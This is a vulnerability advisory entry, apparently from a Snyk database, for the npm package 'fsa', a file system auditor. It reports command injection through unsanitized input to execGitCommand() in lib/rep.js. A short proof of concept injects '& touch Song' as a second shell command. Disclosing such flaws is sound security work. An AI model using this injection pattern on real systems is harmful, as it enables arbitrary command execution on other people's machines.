---
- id: snykio:npm:fsa:564118
  title: Command Injection
  description: |
    [fsa][1] is a File system auditor.

    Affected versions of this package are vulnerable to Command Injection.
    The first argument of `execGitCommand()`, located within `lib/rep.js#63`
    can be controlled by users without any sanitization to inject arbitrary
    commands.

    ### PoC   {#poc}

        var root = require("fsa");
        var attack_code = "& touch Song";
        var dir = "./";
        var options= {};
        root.rep.execGitCommand(attack_code,dir,options,function(){});



    [1]: https://www.npmjs.com/package/fsa
